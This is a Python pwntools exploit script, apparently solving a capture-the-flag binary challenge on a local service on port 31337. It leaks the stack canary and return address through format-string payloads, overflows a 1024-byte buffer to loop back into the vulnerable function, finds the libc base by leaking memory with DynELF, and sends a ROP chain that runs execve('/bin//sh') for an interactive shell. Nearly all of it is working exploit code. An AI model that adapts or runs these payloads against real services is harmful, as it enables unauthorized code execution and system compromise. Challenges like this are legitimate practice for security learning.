from pwn import *

HOST = 'localhost'
PORT = 31337

def chall_connect():
	r = remote(HOST, PORT, level='info')
	#r.recvuntil('Found canary: ')
	#canary = int(r.readline().strip(), 16)
	#log.info('Canary: %08x', canary)
	#return r, canary
	return r, 0

def dump_addr(r, address):
	r.recvuntil('Welcome! What is your name? ')
	payload = ''
	payload += struct.pack('<I', address)
	payload += '%7$s'
	payload += 'STOP'
	r.sendline(payload)

	try:
		r.recvuntil('Hello ')
		data = r.recvuntil('STOP')
		#log.info('Debug: %s', data)
		data = data[4:-4] + '\x00'
	except:
		return None
	return data

def leak_cookie(r, offset):
	r.recvuntil('Welcome! What is your name? ')
	payload = ''
	payload += 'AAAA'
	payload += '%%%d$08x' % offset
	payload += 'BBBB'
	r.sendline(payload)

	try:
		r.recvuntil('Hello ')
		data = r.recvuntil('BBBB')
		data = data[4:-4]
	except:
		return None

	return data


"""
# Find ret offset
#for START in range(0, 200, 5):
for START in range(0, 1000, 5):
	log.info('Start: %d', START)
	r, canary = chall_connect()
	canary = '%08x' % canary
	r.recvuntil('Welcome! What is your name? ')
	payload = ''
	for i in range(START, START+5):
		payload += '%%%d$08x.' % (i+1)
	r.sendline(payload)
	r.recvuntil('Hello ')
	d = r.readline().strip()
	if '726.' in d:
	#if canary in d:
		log.info('Message: "%s"', d)
		log.info('FOUND!')
		#break
	
	r.close()
"""

"""
# Confirm ret and cookie offset
r, _ = chall_connect()
r.recvuntil('Welcome! What is your name? ')
payload = 'AAAA-%283$08x-%279$08x-BBBB'
r.sendline(payload)
r.recvuntil('Hello ')
d = r.readline().strip()
log.info('Message: "%s"', d)
r.close()
"""

"""
# Return into vuln
r, _ = chall_connect()
pause()
r.recvuntil('Welcome! What is your name? ')
payload = 'AAAA-%283$08x-%279$08x-BBBB'
r.sendline(payload)
r.recvuntil('Hello ')
d = r.readline().strip()
data_a, ret1, cookie, data_b = d.split('-')
assert(data_a == 'AAAA')
assert(data_b == 'BBBB')
ret1 = int(ret1, 16)
cookie = int(cookie, 16)

log.info('Ret1: %08x, Cookie: %08x', ret1, cookie)
new_ret = ret1 - 5 # Subtract call length
#new_ret = (ret1 & 0xFFFFF000) | 0x61D # Cheat
log.info('New ret: %08x', new_ret)

r.recvuntil('What can we help you with today? ')
payload = ''
payload += 'A'*1024
payload += struct.pack('<I', cookie)
payload += 'B'*12
payload += struct.pack('<I', new_ret)
#payload += struct.pack('<I', new_ret)
#payload += struct.pack('<I', new_ret)
#payload += struct.pack('<I', new_ret)
r.sendline(payload)
r.interactive()
#"""


def get_base_payload(cookie):
	payload = ''
	payload += 'A'*1024
	payload += struct.pack('<I', cookie)
	payload += 'B'*12
	return payload

def get_loop_payload(cookie, ret):
	payload = ''
	payload += get_base_payload(cookie)
	payload += struct.pack('<I', ret)
	return payload

def first_lap(r):
	#pause()
	r.recvuntil('Welcome! What is your name? ')
	payload = 'AAAA-%283$08x-%279$08x-BBBB'
	r.sendline(payload)
	r.recvuntil('Hello ')
	d = r.readline().strip()
	log.info('Msg: %s', d)
	data_a, ret1, cookie, data_b = d.split('-')
	assert(data_a == 'AAAA')
	assert(data_b == 'BBBB')
	ret1 = int(ret1, 16)
	cookie = int(cookie, 16)

	log.info('Ret1: %08x, Cookie: %08x', ret1, cookie)
	new_ret = ret1 - 5 # Subtract call length
	log.info('New ret: %08x', new_ret)

	r.recvuntil('What can we help you with today? ')
	payload = get_loop_payload(cookie, new_ret)
	r.sendline(payload)

	return cookie, new_ret

def leak_lap(r, addr, cookie, ret):
	leak_data = dump_addr(r, addr)

	r.recvuntil('What can we help you with today?')
	payload = get_loop_payload(cookie, ret)
	r.sendline(payload)

	return leak_data

def dummy_lap(r, cookie, ret):
	r.recvuntil('Welcome! What is your name? ')
	r.sendline('ZetaTwo')
	m = r.readline()
	#log.info('Dummy: %s', m)
	r.recvuntil('What can we help you with today?')
	payload = get_loop_payload(cookie, ret)
	r.sendline(payload)

def rop_lap(r, cookie, ropchain):
	r.recvuntil('Welcome! What is your name? ')
	r.sendline('ZetaTwo')
	m = r.readline()
	#log.info('Dummy: %s', m)
	r.recvuntil('What can we help you with today?')

	payload = ''
	payload += get_base_payload(cookie)
	payload += ropchain
	r.sendline(payload)


def build_rop(base):
	p = ''
	p += struct.pack('<I', base + 0x00001aae) # pop edx ; ret
	p += struct.pack('<I', base + 0x001d8040) # @ .data
	p += struct.pack('<I', base + 0x00024b5e) # pop eax ; ret
	p += '/bin'
	p += struct.pack('<I', base + 0x00075425) # mov dword ptr [edx], eax ; ret
	p += struct.pack('<I', base + 0x00001aae) # pop edx ; ret
	p += struct.pack('<I', base + 0x001d8044) # @ .data + 4
	p += struct.pack('<I', base + 0x00024b5e) # pop eax ; ret
	p += '//sh'
	p += struct.pack('<I', base + 0x00075425) # mov dword ptr [edx], eax ; ret
	p += struct.pack('<I', base + 0x00001aae) # pop edx ; ret
	p += struct.pack('<I', base + 0x001d8048) # @ .data + 8
	p += struct.pack('<I', base + 0x0002e485) # xor eax, eax ; ret
	p += struct.pack('<I', base + 0x00075425) # mov dword ptr [edx], eax ; ret
	p += struct.pack('<I', base + 0x00018be5) # pop ebx ; ret
	p += struct.pack('<I', base + 0x001d8040) # @ .data
	p += struct.pack('<I', base + 0x001926d5) # pop ecx ; ret
	p += struct.pack('<I', base + 0x001d8048) # @ .data + 8
	p += struct.pack('<I', base + 0x00001aae) # pop edx ; ret
	p += struct.pack('<I', base + 0x001d8048) # @ .data + 8
	p += struct.pack('<I', base + 0x0002e485) # xor eax, eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00008aac) # inc eax ; ret
	p += struct.pack('<I', base + 0x00002d37) # int 0x80

	return p


#"""
r, _ = chall_connect()
cookie, loop_ret = first_lap(r)

@pwnlib.memleak.MemLeak.NoNewlines
def leaker(addr):
	if addr == loop_ret & 0xFFFFF000:
		return '\x7fELF'
	if addr & 0xFFF == 0:
		return '\x7fELF'
	log.info('Addr: %08x', addr)
	return leak_lap(r, addr, cookie, loop_ret)

d = DynELF(leaker, loop_ret)
bases = d.bases()
print(bases)

libc_base = bases['/lib/i386-linux-gnu/libc.so.6']
log.info('Libc base: %08x', libc_base)

#print(bases)
#addr_system = d.lookup('system', 'libc')
#print(d.libc)

ropchain = build_rop(libc_base)
rop_lap(r, cookie, ropchain)

#dummy_lap(r, cookie, addr_system)
r.interactive()

#for i in range(5):
#	dummy_lap(r, cookie, loop_ret)
#r.interactive()
#"""